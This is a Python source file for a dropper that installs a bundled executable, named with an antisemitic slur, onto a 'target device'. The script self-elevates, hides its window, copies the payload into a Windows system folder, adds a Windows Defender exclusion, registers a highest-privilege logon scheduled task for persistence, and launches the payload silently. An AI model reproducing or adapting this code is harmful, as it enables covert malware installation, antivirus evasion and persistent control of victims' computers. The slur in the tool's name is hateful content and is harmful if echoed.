import subprocess
import PyElevate
import argparse
import psutil
import shutil
import ctypes
import time
import sys
import os

if "--hidewindow" in sys.argv:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

target_dir = r"C:\ProgramData\Microsoft\Windows\Tasks" # can be where ever the fuck you want, as long as it will be able to access it
printnonerrors = False

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
os.chdir(SCRIPT_DIR)

# running as .py will just compile it, the uncompiled version does not work

# this is a alternive to the normal startup command for jewfuss-xt, this version will auto exempt from windows defender and create a scheduled task to run as admin for any user on startup
# using the $startup commmand will break this as it moves the location of jewfuss-xt, in witch the scheduled task will not be able to find it etc, so just dont use the command :)
# using this requires a bit of setup, first complie jewfuss-xt and leave it in the builds folder
# than compile this script using the command above, and run it the output exe as as adminastrator on target device

# Define the target directory and name of bundled executable to run

try:
    if os.path.splitext(sys.argv[0])[1].lower() != ".exe":  # Compile if running as .py
        parser = argparse.ArgumentParser()
        parser.add_argument('--file', type=str, default=None)
        parser.add_argument('--icon', type=str, default=None)
        parser.add_argument('--name', type=str, default=None)
        args = parser.parse_args()
        
        if args.icon is not None:
            installer_icon = f'--icon "{args.icon}"'
        else:
            installer_icon = ""
        
        if args.file == None:
            input_exe = input("Enter the name of the executable in the builds folder, leave empty to use JewFuss-XT.exe:\n>> ")
        else:
            print(f'Using provided file: "{args.file}"')
            input_exe = args.file
            
        if not input_exe:
            input_exe = "JewFuss-XT.exe"

        while not os.path.exists(f"builds/{input_exe}"):
            input_exe = input("Invalid executable (Tip: make sure the executable is in the builds folder):\n>> ")
        
        temp_file_path = "executablename.txt"
        with open(temp_file_path, "w") as f:
            f.write(input_exe)
            
        if args.name is not None:
            installer_name = f'--name "{args.name}"'
        else:
            installer_name = f'--name "{input_exe.removesuffix(".exe")}-installer"'

        os.system(f'cd {os.path.dirname(os.path.abspath(sys.argv[0]))} && pyinstaller --onefile --add-binary="builds/{input_exe};." --add-data="{temp_file_path};." --distpath=builds --workpath=data {installer_name} {installer_icon} {sys.argv[0]}')
        os.remove(temp_file_path)
        sys.exit("\nFinished compiling")

except KeyboardInterrupt:
    sys.exit("Keyboard interrupt, exiting compiler...")

except Exception as e:
    print(f"Error compiling: {e}")
    errored = True

PyElevate.elevate()
if not PyElevate.elevated():
    ctypes.windll.user32.MessageBoxW(0, "Please run as administrator.", "Permissions error", 0x10)
    sys.exit(0)

if getattr(sys, 'frozen', False):
    base_path = sys._MEIPASS
else:
    base_path = os.path.dirname(os.path.abspath(__file__))

temp_file_path = os.path.join(base_path, "executablename.txt")

try:
    with open(temp_file_path, "r") as f:
        app_name = f.read().strip()
except FileNotFoundError:
    app_name = "JewFuss-XT.exe"

errored = False # Don't change
def add_defender_exclusion(file_path):
    global errored
    try:
        folder = os.path.dirname(file_path)
        defender_command = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{folder}\\""'
        subprocess.run(defender_command, shell=True, check=True)
        if printnonerrors:
            print(f"Windows Defender exclusion added for {folder}")
    except subprocess.CalledProcessError as e:
        print(f"Error adding Defender exclusion: {e}")
        errored = True

def create_scheduled_task(task_name, file_path):
    global errored
    try:
        schtasks_command = (
            f'schtasks /create /tn "{task_name}" /tr "{file_path}" '
            f'/sc onlogon /ru "INTERACTIVE" /rl highest /f /it'
        )
        
        disable_conditions_command = (
            f'powershell -Command "'
            f'$task = Get-ScheduledTask -TaskName \\"{task_name}\\"; '
            f'$task.Settings.DisallowStartIfOnBatteries = $false; '  # Allow task to start on battery
            f'$task.Settings.StopIfGoingOnBatteries = $false; '      # Do not stop if switching to battery
            f'$task.Settings.ExecutionTimeLimit = \'PT0S\'; '       # Disable time limit
            f'Set-ScheduledTask -TaskName \\"{task_name}\\" -Settings $task.Settings"'
        )

        subprocess.run(schtasks_command, shell=True, check=True)
        subprocess.run(disable_conditions_command, shell=True, check=True)
        
        if printnonerrors: print(f"Scheduled task '{task_name}' created successfully with modified power & time conditions.")
    
    except subprocess.CalledProcessError as e:
        print(f"Error creating scheduled task: {e}")
        errored = True

if not PyElevate.elevated():
    input("Please run this installer as an administrator.")
    sys.exit(0)

if not os.path.exists(target_dir):
    os.makedirs(target_dir)
    if printnonerrors: print(f"Created folder: {target_dir}")

if getattr(sys, 'frozen', False):
    temp_dir = sys._MEIPASS
else:
    temp_dir = os.path.dirname(os.path.abspath(__file__))

extracted_app_path = os.path.join(temp_dir, app_name)
final_app_path = os.path.join(target_dir, app_name)

if printnonerrors: print(f"Installing to: {final_app_path}")

try:
    if os.path.exists(final_app_path):
        if printnonerrors: print(f"Found existing file")
        try:
            if any(app_name.lower() in (p.info['exe'] or '').lower() for p in psutil.process_iter(['exe'])): 
                if printnonerrors: print("Terminating existing process...")
                os.system(f'taskkill /im "{app_name}" /f ')
                if printnonerrors: print(f"Terminated {app_name}, waiting a second for process to close...")
                time.sleep(1)
            os.remove(final_app_path)
            if printnonerrors: print(f"Deleted existing file: {app_name}")
        except Exception as e:
            print(f"Error deleting existing file: {e}\nRetrying in 1 second...")
            time.sleep(1)
            try:
                os.remove(final_app_path)
            except Exception as e:
                print(f"Fatal Error: Error deleting existing file: {e}")
            input("Press Enter to exit.")
            sys.exit(1)
    try:
        shutil.copy(extracted_app_path, final_app_path)
        if printnonerrors: print(f"Copied {app_name} to {target_dir}")
    except Exception as e:
        print(f"Fatal Error: Error moving file: {e}")
        input("Press Enter to exit.")
        sys.exit(1)

except Exception as e:
    input(f"Fatal Error: Error moving file: {e}")
    sys.exit(1)

add_defender_exclusion(final_app_path)
create_scheduled_task(app_name.replace(".exe", ""), final_app_path)

try:
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    subprocess.Popen(final_app_path, startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
    if printnonerrors: print(f"Started {final_app_path} silently (no console)")
except Exception as e:
    print(f"Error running {app_name}: {e}")
    errored = True

if errored:
    input("Press Enter to exit.")    
sys.exit(0)